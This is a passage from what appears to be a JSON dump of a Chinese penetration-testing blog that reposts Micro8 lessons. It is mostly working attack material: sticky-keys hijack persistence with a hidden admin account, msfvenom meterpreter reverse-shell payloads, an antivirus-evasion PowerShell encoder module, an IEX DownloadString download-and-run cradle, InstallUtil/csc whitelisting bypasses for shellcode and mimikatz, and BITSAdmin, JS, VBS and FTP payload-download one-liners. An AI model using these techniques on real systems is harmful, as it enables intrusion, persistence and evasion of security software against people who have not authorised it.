\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" 命令说明：reg add是向注册表添加记录，后面跟的是注册表的位置，注意的是HKLM是HKEY_LOCAL_MACHINE的缩写。Image File Execution Option这个目录是用来设置镜像劫持的，要被劫持的就是命令中的sethc粘滞键程序，随后通过/ v来指定键名，其中键名debugger是固定的，然后通过/ t来指定REG_SZ字符串类型，最后通过/ d来指定键的值，即被恶意替换的程序cmd.exe。 这样，在下次远程连接目标主机登录的时候就可以连续5下SHIFT触发cmd.exe； 可以输入explorer.exe调出程序管理系统方便操作； 当然，上面的方法存在缺陷，就是可能会导致远程连接无法持久进行，因此可以直接添加新用户便于下次直接登录： 12net user mi1k7ea 123456 /addnet localgroup administrators mi1k7ea /add' 防御方法 如果系统盘为NTFS文件系统，可以将sytem32下的sethc.exe文件设为everyone拒绝访问； 直接将其删除，最好的方法是在控制面板-辅助功能选项-粘滞键选项，将“使用快捷键”取消即可。； 通过注册表设置实现防御；","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"基于SqlDataSourceEnumerator探测内网存活主机","date":"2021-03-06T06:24:00.000Z","path":"2021/03/06/基于SqlDataSourceEnumerator探测内网存活主机/","text":"0x00 前言参考Micro8系列第五十课：https://micro8.gitbook.io/micro8/contents-1/41-50/50-ji-yu-sqldatasourceenumerator-fa-xian-nei-wang-cun-huo-zhu-ji 0x01 基于SqlDataSourceEnumerator探测内网存活主机从Windows XP开始，默认就带有.NET Framework，而在PowerShell出现之后，其调用更为简便。 System.Data.SqlClient命名空间是用于SQL Server的.NET数据提供程序。在.NET Framework 2.0中新增加SqlDataSourceEnumerator类，其提供了一种枚举本地网络内的所有可用SQL Server实例机制。 微软官方是这样解释的：https://docs.microsoft.com/zh-CN/dotnet/api/system.data.sql.sqldatasourceenumerator?view=netframework-4.8&amp;viewFallbackFrom=netcore-3.0 SQL Server 使应用程序能够确定当前网络中是否存在其实例。 SqlDataSourceEnumerator类向应用程序开发人员公开此信息，并提供 DataTable 包含有关所有可用服务器的信息。 此返回的表包含与用户尝试创建新连接时提供的列表匹配的服务器实例的列表，并且在 Connection Properties 对话框中展开包含所有可用服务器的下拉列表。 调用示例： 12PowerShell -Command \"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()\" 该方法在实战中不留文件痕迹并且信息准确，同时可以进行主机发现。可应对目前主流安全防御产品。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"关于Powershell对抗安全软件","date":"2021-03-06T06:20:59.000Z","path":"2021/03/06/关于Powershell对抗安全软件/","text":"0x00 前言参考Micro8系列第四十九课：https://micro8.gitbook.io/micro8/contents-1/41-50/49-guan-yu-powershell-dui-kang-an-quan-ruan-jian 0x01 PowerShell对抗安全软件Windows PowerShell是以.NET Framework技术为基础，并且与现有的WSH保持向后兼容，因此它的脚本程序不仅能访问.NET CLR，也能使用现有的COM技术。同时也包含了数种系统管理工具、简易且一致的语法，提升管理者处理，常见如登录数据库、WMI。 Exchange Server 2007以及System Center Operations Manager 2007等服务器软件都将内置Windows PowerShell。 Windows PowerShell的强大，并且内置，在渗透过程中，也让渗透变得更加有趣。而安全软件的对抗查杀也逐渐开始针对PowerShell的一切行为。 在https://technet.microsoft.com中，找到关于其参数的说明如下： Here is a listing of the available startup parameters: -Command Specifies the command text to execute as though it were typed at the PowerShell command prompt. -EncodedCommand Specifies the base64-encoded command text to execute. -ExecutionPolicy Sets the default execution policy for the console session. -File Sets the name of a script fi le to execute. -InputFormat Sets the format for data sent to PowerShell as either text string or serialized XML. The default format is XML. Valid values are text and XML. -NoExit Does not exit after running startup commands. This parameter is useful when you run PowerShell commands or scripts via the command prompt (cmd.exe). -NoLogo Starts the PowerShell console without displaying the copyright banner. -Noninteractive Starts the PowerShell console in non-interactive mode. In this mode, PowerShell does not present an interactive prompt to the user. -NoProfile Tells the PowerShell console not to load the current user’s profile. -OutputFormat Sets the format for output as either text string or serialized XML. The default format is text. Valid values are text and XML. -PSConsoleFile Loads the specified Windows PowerShell console file. Console files end with the .psc1 extension and can be used to ensure that specific snap-in extensions are loaded and available. You can create a console file using Export-Console in Windows PowerShell. -Sta Starts PowerShell in single-threaded mode. -Version Sets the version of Windows PowerShell to use for compatibility, such as 1.0. -WindowStyle Sets the window style as Normal, Minimized, Maximized, or Hidden. The default is Normal. 针对PowerShell的特性，本地测试： 1Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('Mi1k7ea') 编码再执行： 1powershell.exe -EncodedCommand QWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBQcmVzZW50YXRpb25GcmFtZXdvcms7W1N5c3RlbS5XaW5kb3dzLk1lc3NhZ2VCb3hdOjpTaG93KCdNaTFrN2VhJyk= 如今越来越多的安全软件开始查杀PowerShell的部分行为或特征。 以msfvenom为例，生成payload： 123456root@dde077eebdfc:/# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.17.0.2 LPORT=8080 -f psh-reflection &gt; mi1k7ea.ps1[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payloadNo encoder specified, outputting raw payloadPayload size: 510 bytesFinal size of psh-reflection file: 2826 bytes 此时，mi1k7ea.ps1很大可能就被杀软干掉了： 于此，可以针对PowerShell的特性来更改payload： 12 接着，就是要把以上重复的工作实现自动化，并且针对PowerShell的DownloadString特性来设计出两种形式的payload： 目标机出网； 目标机不出网； 同时还需要根据需求，和Metasploit进行无缝连接。 根据微软文档，可以找到可能对以上有帮助的一些属性： WindowStyle NoExit EncodedCommand exec 自动化实现如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# copy base64.rb to metasploit-framework/embedded/framework/modules/encoders/powershell.If powershell is empty,mkdir powershell.# E.g# msf encoder(powershell/base64) &gt; use exploit/multi/handler# msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp# payload =&gt; windows/x64/meterpreter/reverse_tcp# msf exploit(multi/handler) &gt; exploit# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=xx -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell/base64 --arch x64 --platform windows.# [*] Started reverse TCP handler on xx.1xx.xx.xx:xxclass MetasploitModule &lt; Msf::Encoder Rank = NormalRankingdef initialize super( 'Name' =&gt; 'Powershell Base64 Encoder', 'Description' =&gt; %q&#123; msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=xx-f psh-reflection --arch x64 --platform windows | msfvenom -epowershell/base64 --arch x64 --platform windows. &#125;, 'Author' =&gt; 'Micropoor', 'Arch' =&gt; ARCH_CMD, 'Platform' =&gt; 'win')register_options([OptBool.new('payload', [ false, 'Use payload ', false ]), OptBool.new('x64',[ false, 'Use syswow64 powershell', false ])])enddef encode_block(state, buf)base64 = Rex::Text.encode_base64(Rex::Text.to_unicode(buf)) cmd = ''if datastore['x64'] cmd += 'c:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe 'else cmd += 'powershell.exe ' endif datastore['payload'] cmd += '-windowstyle hidden -exec bypass -NoExit ' endcmd += \"-EncodedCommand \\#&#123;base64&#125;\" endend# if use caidao# execute echo powershell -windowstyle hidden -exec bypass -c \\\"\"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.117/xxx.ps1');\\\"\"|msfvenom -e x64/xor4 --arch x64 --platform windows# xxx.ps1 is msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx LPORT=xx -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell/base64 --arch x64 --platform windows. 如注释说：复制base64.rb到metasploit-framework/embedded/framework/modules/encoders/powershell目录中，如果powershell目录不存在就直接新建即可。 参数payload选择是否使用Metasploit payload，来去掉PowerShell的关键字。 目标出网，下载执行1echo powershell -windowstyle hidden -exec bypass -c \\\"\"IEX (New-Object Net.WebClient).DownloadString('http://172.23.72.159/mi1k7ea.ps1');\\\"\"|msfvenom -e powershell/base64 --arch x64 --platform windows 目标不出网，本地执行1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.17.0.2 LPORT=8080 -f psh-reflection --arch x64 --platform windows | msfvenom -e powershell/base64 --arch x64 --platform windows payload More将出网payload的down内容更改为不出网payload的内容，并且去掉payload参数来减小payload大小。 更改Invoke-Mimikatz.ps1等。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"MSF payload分离免杀思路","date":"2021-03-06T06:18:33.000Z","path":"2021/03/06/MSF-payload分离免杀思路/","text":"0x00 前言参考Micro8系列第四十七课：https://micro8.gitbook.io/micro8/contents-1/41-50/47payload-fen-li-mian-sha-si-lu 参考Micro8系列第四十八课：https://micro8.gitbook.io/micro8/contents-1/41-50/48payload-fen-li-mian-sha-si-lu-di-er-ji 0x01 32位系统payload分离免杀 目前的反病毒安全软件，常见有三种，一种基于特征，一种基于行为，一种基于云查杀。云查杀的特点基本也可以概括为特征查杀。无论是哪种，都是特别针对 PE 头文件的查杀。尤其是当 payload 文件越大的时候，特征越容易查杀。 既然知道了目前的主流查杀方式，那么反制查杀，此篇采取特征与行为分离免杀。避免 PE 头文件，并且分离行为，与特征的综合免杀。适用于菜刀下等场景，也是我在基于 windows 下为了更稳定的一种常用手法。载入内存。 下面以MSF为例。 先开启MSF监听： 1234567891011121314151617181920212223242526272829303132333435msf6 &gt; use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf6 exploit(multi/handler) &gt; set lport 8080lport =&gt; 8080msf6 exploit(multi/handler) &gt; show optionsModule options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- -----------Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST yes The listen address (an interface may be specified) LPORT 8080 yes The listen portExploit target: Id Name -- ---- 0 Wildcard Targetmsf6 exploit(multi/handler) &gt; set lhost 172.17.0.2lhost =&gt; 172.17.0.2msf6 exploit(multi/handler) &gt; exploit -z[*] Started reverse TCP handler on 172.17.0.2:8080 接着，payload不采取生成PE文件的方式，而是采取Shellcode的方式、借助第三方直接加载到内存中、避免相关的检测行为： 1msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.17.0.2 lport=8080 -e x86/shikata_ga_nai -i 5 -f raw &gt; test.c 既然是Shellcode方式的payload，那么一定需要借助第三方来启动，加载到内存。 自己写第三方加载内存来执行Shellcode是可以的，也可以借用GitHub上的一个开源项目来实现：https://github.com/clinicallyinane/shellcode_launcher/ 123D:\\sec\\tools\\shellcode_launcher-master&gt;shellcode_launcher.exe -i test.cStarting upCalling file now. Loaded binary at: 0x001e0000 virscan免杀效果： virustotal免杀效果，相比之前是提高了查杀率了： 0x02 64位系统payload分离免杀前面的payload分离免杀思路是专门针对32位系统以及针对包括XP以下版本系统的。而在实战中，目标机器多为Windows 7以上版本，并且以64位居多。 前面的思路是借助了非微软自带第三方来执行Shellcode，而本次将采取调用微软自带来执行Shellcode，好处就是调用自带本身一定就会有微软的签名，从而绕过反病毒软件。 Windows 自 Windows XP Media Center Edition 开始默认安装 NET Framework，直至目前的 Windows 10，最新的默认版本为4.6.00081.00。随着装机量，最新默认安装版本为4.7.2053.0。 csc.exeC#是一个现代的、通用的、面向对象的编程语言，它是由微软（Microsoft）开发的，由Ecma和ISO核准认可的。 C#在Windows平台下的编译器名称是csc.exe，如果.NET FrameWork SDK安装在C盘，那么jiu可以在C:\\Windows\\Microsoft.NET\\Framework\\xxxxx目录中找到它。为了使用方便，可以将该目录添加到Path环境变量中去。 test.cs： 12345678using System;class TestApp&#123; public static void Main() &#123; Console.WriteLine(&quot;Mi1k7ea!&quot;); &#125;&#125; 输入下列行命令就能将test.cs编译成名为test.exe的console应用程序： 12345678910D:\\tmp&gt;csc /target:exe test.csMicrosoft (R) Visual C# Compiler version 4.8.3761.0for C# 5Copyright (C) Microsoft Corporation. All rights reserved.This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240D:\\tmp&gt;test.exeMi1k7ea! InstallUtil.exe微软官方介绍如下： The Installer tool is a command-line utility that allows you to install and uninstall server resources by executing the installer components in specified assemblies. This tool works in conjunction with classes in the System.Configuration.Install namespace. This tool is automatically installed with Visual Studio. To run the tool,use the Developer Command Prompt (or the Visual Studio Command Prompt in Windows7). For more information, see Command Prompts. https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool 32位和64位的默认安装路径： 12C:\\Windows\\Microsoft.NET\\FrameworkC:\\Windows\\Microsoft.NET\\Framework64 Demo1以抓密码为例。 生成密钥： 1sn -k installutil.snk 执行csc： 1C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /r:System.IO.Compression.dll /target:library /out:Mi1k7ea.exe /keyfile:C:\\Users\\Johnn\\Desktop\\installutil.snk /unsafe C:\\Users\\Johnn\\Desktop\\mimi.cs 执行InstallUtil： 1C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\Johnn\\Desktop\\Mi1k7ea.exe Demo2以MSF为例。 生成Shellcode： 1msfvenom --platform Windows -a x64 -p windows/x64/meterpreter/reverse_tcp_uuid LHOST=192.168.1.5 LPORT=8080 -b '\\x00' -e x64/xor -i 10 -f csharp -o ./Mi1k7ea.txt 替换Shellcode，M.cs： 12 编译： 1C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc.exe /unsafe /platform:x64 /out:Mi1k7ea.exe M.cs 运行： 1C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe /logfile= /LogToConsole=false /U Mi1k7ea.exe 注意，在实际测试的过程，开启监听需要配置一些参数，防止假死与假session： 12345678910msf exploit(multi/handler) &gt; set exitonsession false exitonsession =&gt; falsemsf exploit(multi/handler) &gt; set EnableStageEncoding trueEnableStageEncoding =&gt; truemsf exploit(multi/handler) &gt;msf exploit(multi/handler) &gt; set Stageencoder x64/xor Stageencoder =&gt; x64/xormsf exploit(multi/handler) &gt; set stageencodingfallback falsestageencodingfallback =&gt; falsemsf exploit(multi/handler) &gt; exploit -j -z 这里暂时无对应的cs文件。。。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"},{"name":"免杀","slug":"免杀","permalink":"https://www.mi1k7ea.com/tags/免杀/"}]},{"title":"PowerShell一句话下载payload","date":"2021-03-06T06:16:34.000Z","path":"2021/03/06/PowerShell一句话下载payload/","text":"0x00 前言参考Micro8系列第四十六课：https://micro8.gitbook.io/micro8/contents-1/41-50/46powershell-yi-ju-hua-xia-zai-payload 0x01 PowerShell一句话下载payload自Windows 7开始，Windows系统均内置了PowerShell。 基于System.Net.WebClientdown.ps1： 1234567$Urls = @()$Urls += \"http://127.0.0.1/test.txt\"$OutPath = \"D:\\tmp\\\" ForEach ( $item in $Urls) &#123;$file = $OutPath + ($item).split('/')[-1](New-Object System.Net.WebClient).DownloadFile($item, $file) &#125; 执行： 1powershell -File down.ps1 基于Invoke-WebRequest在PowerShell 3.0以后，提供wget功能，即Invoke-WebRequest。 down.ps1： 12345$Urls += \"http://127.0.0.1/test.txt\"$OutPath = \"D:\\tmp\\\" $start_time = Get-DateInvoke-WebRequest -Uri $url -OutFile $outputWrite-Output \"Time : $((Get-Date).Subtract($start_time).Seconds) second(s)\" 执行，需要绝对路径： 1powershell D:\\tmp\\down.ps1 当然也可以一句话下载： 1powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://127.0.0.1/test.txt','D:\\tmp\\test.txt')","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"解决BAT一句话下载payload黑窗","date":"2021-03-06T06:14:04.000Z","path":"2021/03/06/解决BAT一句话下载payload黑窗/","text":"0x00 前言参考Micro8系列第四十五课：https://micro8.gitbook.io/micro8/contents-1/41-50/45-jie-jue-bat-yi-ju-hua-xia-zai-payload-hei-chuang 0x01 BAT一句话下载payload在实战中，针对不同的环境执行BAT的问题，可能需要不同的方案来实现。 bat.vbs： 1234Set oShell = CreateObject (\"Wscript.Shell\")Dim strArgsstrArgs = \"cmd /c bat.bat\"oShell.Run strArgs, 0, false 运行该VBS脚本即可执行bat文件中的指令： 123D:\\tmp&gt;cscript bat.vbsMicrosoft (R) Windows Script Host Version 5.812版权所有(C) Microsoft Corporation。保留所有权利。 但是前面bat.vbs代码过长，需要追加写入的话需要简化下代码： 1CreateObject(\"Wscript.Shell\").Run \"bat.bat\", 0, True 如果需要在目标机上执行多个bat，则需要把代码中的bat.bat变成变量的形式： 1234567891011If WScript.Arguments.Count &gt;= 1 ThenReDim arr(WScript.Arguments.Count-1)For i = 0 To WScript.Arguments.Count-1Arg = WScript.Arguments(i)If InStr(Arg, \" \") &gt; 0 Then Arg = \"\"\"\" &amp; Arg &amp; \"\"\"\"arr(i) = ArgNext RunCmd = Join(arr)CreateObject(\"Wscript.Shell\").Run RunCmd, 0, TrueEnd If 此时运行需要加上参数： 123D:\\tmp&gt;cscript bat.vbs bat.batMicrosoft (R) Windows Script Host Version 5.812版权所有(C) Microsoft Corporation。保留所有权利。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"CertUtil+Invoke-CradleCrafter组合利用","date":"2021-03-06T06:13:17.000Z","path":"2021/03/06/CertUtil-Invoke-CradleCrafter组合利用/","text":"0x00 前言参考Micro8系列第四十四课：https://micro8.gitbook.io/micro8/contents-1/41-50/44ertutil-yi-ju-hua-xia-zai-payload-bu-chong 0x01 Invoke-CradleCrafterInvoke-CradleCrafter是与PowerShell v2.0+兼容的PowerShell远程下载框架生成器和混淆器。 项目地址： 使用方法： 12Import-Module ./Invoke-CradleCrafter.psd1Invoke-CradleCrafter …","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"JS一句话下载payload","date":"2021-03-06T06:12:26.000Z","path":"2021/03/06/JS一句话下载payload/","text":"0x00 前言参考Micro8系列第四十三课：https://micro8.gitbook.io/micro8/contents-1/41-50/43js-yi-ju-hua-xia-zai-payload#fu-dai-ma-1 0x01 JS一句话下载payloadWindows全版本支持JS，并且通过cscript来调用达到下载payload的目的。 读取远程文件readfile.js： 1234var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");WinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); 一句话读取远程文件payload： 12D:\\&gt;cscript /nologo readfile.js http://127.0.0.1/test.txtmi1k7ea 写入文件downfile.js： 12345678var WinHttpReq = new ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");WinHttpReq.Open(\"GET\", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject(\"ADODB.Stream\"); BinStream.Type = 1;BinStream.Open(); BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile(\"mi1k7ea.exe\"); 一句话写入文件payload： 1cscript /nologo downfile.js http://127.0.0.1/test.txt","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"MSF攻击FTP服务","date":"2021-03-06T06:11:31.000Z","path":"2021/03/06/MSF攻击FTP服务/","text":"0x00 前言参考Micro8系列第四十二课：https://micro8.gitbook.io/micro8/contents-1/41-50/42-gong-ji-ftp-fu-wu 0x01 MSF攻击FTP服务MSF中常用攻击FTP服务的模块如下： MSF模块 说明 auxiliary/scanner/ftp/ftp_version FTP版本扫描器 auxiliary/scanner/ftp/ftp_login FTP认证扫描器 auxiliary/scanner/ftp/anonymous 匿名访问检测 auxiliary/fuzzers/ftp/client_ftp 简单的FTP客户端Fuzz工具 auxiliary/fuzzers/ftp/ftp_pre_post 简单的FTP Fuzz工具 更多的FTP模块可以使用MSF的search结合type搜索： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657msf6 &gt; search type:auxiliary ftpMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/networking/cisco_vpn_3000_ftp_bypass 2006-08-23 normal No Cisco VPN Concentrator 3000 FTP Unauthorized Administrative Access 1 auxiliary/admin/officescan/tmlisten_traversal normal No TrendMicro OfficeScanNT Listener Traversal Arbitrary File Access 2 auxiliary/admin/tftp/tftp_transfer_util normal No TFTP File Transfer Utility 3 auxiliary/dos/scada/d20_tftp_overflow 2012-01-19 normal No General Electric D20ME TFTP Server Buffer Overflow DoS 4 auxiliary/dos/windows/ftp/filezilla_admin_user 2005-11-07 normal No FileZilla FTP Server Admin Interface Denial of Service 5 auxiliary/dos/windows/ftp/filezilla_server_port 2006-12-11 normal No FileZilla FTP Server Malformed PORT Denial of Service 6 auxiliary/dos/windows/ftp/guildftp_cwdlist 2008-10-12 normal No Guild FTPd 0.999.8.11/0.999.14 Heap Corruption 7 auxiliary/dos/windows/ftp/iis75_ftpd_iac_bof 2010-12-21 normal No Microsoft IIS FTP Server Encoded Response Overflow Trigger 8 auxiliary/dos/windows/ftp/iis_list_exhaustion 2009-09-03 normal No Microsoft IIS FTP Server LIST Stack Exhaustion 9 auxiliary/dos/windows/ftp/solarftp_user 2011-02-22 normal No Solar FTP Server Malformed USER Denial of Service 10 auxiliary/dos/windows/ftp/titan626_site 2008-10-14 normal No Titan FTP Server 6.26.630 SITE WHO DoS 11 auxiliary/dos/windows/ftp/vicftps50_list 2008-10-24 normal No Victory FTP Server 5.0 LIST DoS 12 auxiliary/dos/windows/ftp/winftp230_nlst 2008-09-26 normal No WinFTP 2.3.0 NLST Denial of Service 13 auxiliary/dos/windows/ftp/xmeasy560_nlst 2008-10-13 normal No XM Easy Personal FTP Server 5.6.0 NLST DoS 14 auxiliary/dos/windows/ftp/xmeasy570_nlst 2009-03-27 normal No XM Easy Personal FTP Server 5.7.0 NLST DoS 15 auxiliary/dos/windows/tftp/pt360_write 2008-10-29 normal No PacketTrap TFTP Server 2.2.5459.0 DoS 16 auxiliary/dos/windows/tftp/solarwinds 2010-05-21 normal No SolarWinds TFTP Server 10.4.0.10 Denial of Service 17 auxiliary/fuzzers/ftp/client_ftp normal No Simple FTP Client Fuzzer 18 auxiliary/fuzzers/ftp/ftp_pre_post normal No Simple FTP Fuzzer 19 auxiliary/gather/apple_safari_ftp_url_cookie_theft 2015-04-08 normal No Apple OSX/iOS/Windows Safari Non-HTTPOnly Cookie Theft 20 auxiliary/gather/d20pass 2012-01-19 normal No General Electric D20 Password Recovery 21 auxiliary/gather/konica_minolta_pwd_extract normal No Konica Minolta Password Extractor 22 auxiliary/scanner/ftp/anonymous normal No Anonymous FTP Access Detection 23 auxiliary/scanner/ftp/bison_ftp_traversal 2015-09-28 normal Yes BisonWare BisonFTP Server 3.5 Directory Traversal Information Disclosure 24 auxiliary/scanner/ftp/colorado_ftp_traversal 2016-08-11 normal Yes ColoradoFTP Server 1.3 Build 8 Directory Traversal Information Disclosure 25 auxiliary/scanner/ftp/easy_file_sharing_ftp 2017-03-07 normal Yes Easy File Sharing FTP Server 3.6 Directory Traversal 26 auxiliary/scanner/ftp/ftp_login normal No FTP Authentication Scanner 27 auxiliary/scanner/ftp/ftp_version normal No FTP Version Scanner 28 auxiliary/scanner/ftp/konica_ftp_traversal 2015-09-22 normal Yes Konica Minolta FTP Utility 1.00 Directory Traversal Information Disclosure 29 auxiliary/scanner/ftp/pcman_ftp_traversal 2015-09-28 normal Yes PCMan FTP Server 2.0.7 Directory Traversal Information Disclosure 30 auxiliary/scanner/ftp/titanftp_xcrc_traversal 2010-06-15 normal No Titan FTP XCRC Directory Traversal Information Disclosure 31 auxiliary/scanner/http/titan_ftp_admin_pwd normal No Titan FTP Administrative Password Disclosure 32 auxiliary/scanner/misc/zenworks_preboot_fileaccess normal No Novell ZENworks Configuration Management Preboot Service Remote File Access 33 auxiliary/scanner/portscan/ftpbounce normal No FTP Bounce Port Scanner 34 auxiliary/scanner/quake/server_info normal No Gather Quake Server Information 35 auxiliary/scanner/rsync/modules_list normal No List Rsync Modules 36 auxiliary/scanner/snmp/cisco_config_tftp normal No Cisco IOS SNMP Configuration Grabber (TFTP) 37 auxiliary/scanner/snmp/cisco_upload_file normal No Cisco IOS SNMP File Upload (TFTP) 38 auxiliary/scanner/ssh/cerberus_sftp_enumusers 2014-05-27 normal No Cerberus FTP Server SFTP Username Enumeration 39 auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp 2011-12-12 normal No IpSwitch WhatsUp Gold TFTP Directory Traversal 40 auxiliary/scanner/tftp/netdecision_tftp 2009-05-16 normal No NetDecision 4.2 TFTP Directory Traversal 41 auxiliary/scanner/tftp/tftpbrute normal No TFTP Brute Forcer 42 auxiliary/server/capture/ftp normal No Authentication Capture: FTP 43 auxiliary/server/ftp normal No FTP File Server 44 auxiliary/server/pxeexploit normal No PXE Boot Exploit Server 45 auxiliary/server/tftp normal No TFTP File Server 46 auxiliary/server/wget_symlink_file_write 2014-10-27 normal No GNU Wget FTP Symlink Arbitrary Filesystem AccessInteract with a module by name or index. For example info 46, use 46 or use auxiliary/server/wget_symlink_file_write","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Metasploit","slug":"Metasploit","permalink":"https://www.mi1k7ea.com/tags/Metasploit/"}]},{"title":"BITSAdmin一句话下载payload","date":"2021-03-06T06:10:22.000Z","path":"2021/03/06/BITSAdmin一句话下载payload/","text":"0x00 前言参考Micro8系列第四十一课：https://micro8.gitbook.io/micro8/contents-1/41-50/41bitsadmin-yi-ju-hua-xia-zai-payload 0x01 BITSAdmin一句话下载payload BITSAdmin是一个命令行工具，可用于创建下载或上传并监视其进度。 更多资料可参考微软官方文档：https://docs.microsoft.com/zh-cn/windows/win32/bits/bitsadmin-tool 自Windows 7以上版本内置了BITSAdmin，它可以在网络不稳定的状态下下载文件，出错会自动重试，在比较复杂的网络环境下有着不错的性能。 一句话下载payload： 1bitsadmin /rawreturn /transfer down \"http://127.0.0.1/test.txt\" D:\\test.txt /rawreturn参数：返回适合解析的数据； /transfer参数：传输一个或多个文件。其中紧接的第一个参数值down是本次传输任务的名称，第二个参数值是远程需要传输的文件，第三个参数是传输到的本地目标文件； 如果需要下载过大的文件，需要提高优先级。配合上面的下载命令，再次执行： 1bitsadmin /setpriority down foreground /setpriority参数：设置特定任务的优先级； 如果下载文件在1-5M之间，需要实时查看进度，可以使用进度条： 1bitsadmin /transfer down /download /priority normal \"http://127.0.0.1/test.txt\" D:\\test.txt 注意：BITSAdmin需要服务器支持Range头，并且BITSAdmin不支持HTTPS。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"FTP一句话下载payload","date":"2021-02-27T05:41:18.000Z","path":"2021/02/27/FTP一句话下载payload/","text":"0x00 前言参考Micro8系列第四十课：https://micro8.gitbook.io/micro8/contents-1/31-40/40ftp-yi-ju-hua-xia-zai-payload 0x01 FTP一句话下载payload所有版本的Windows均自带FTP，在实战中需要考虑两点： 数据传输的完整性； 代码需要精简； FTP文件传输方式： 二进制传输； ASCII传输； 在FTP文件传输过程中： ASCII传输 HTML 和文本编写的文件； 二进制码传输可以传送文本和非文本（执行文件，压缩文件，图片等）； 二进制码传输速度比ASCII传输要快 所以在建立BAT脚本时，一般输入bin命令，启用二进制传输。如果用ASCII模式传输非文本文件，可能会显示一堆乱码。 ASCII和二进制模式的区别是回车换行的处理。二进制模式不对数据进行任何处理，ASCII模式将回车换行转换为本机的回车字符，比如Unix下是\\n, Windows 下是\\r\\n，Mac下是\\r。Unix系统下行结束符是一个字节，即十六进制的0A，而ms的系统是两个字节，即十六进制的0D0A。 123456echo open 192.168.1.115 21&gt; ftp.txtecho 123&gt;&gt; ftp.txt //userecho 123&gt;&gt; ftp.txt //passwordecho binary &gt;&gt; ftp.txt //bin模式echo get robots.txt &gt;&gt; ftp.txtecho bye &gt;&gt; ftp.txt","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"}]},{"title":"CertUtil一句话下载payload","date":"2021-02-27T05:40:33.000Z","path":"2021/02/27/CertUtil一句话下载payload/","text":"0x00 前言参考Micro8系列第三十八课：https://micro8.gitbook.io/micro8/contents-1/31-40/38certutil-yi-ju-hua-xia-zai-payload 0x01 CertUtil简介微软官方文档：https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil Certutil.exe 是命令行程序，作为证书服务的一部分进行安装。 你可以使用 certutil.exe 来转储和显示证书颁发机构 (CA) 配置信息、配置证书服务、备份和还原 CA 组件以及验证证书、密钥对和证书链。 如果 certutil 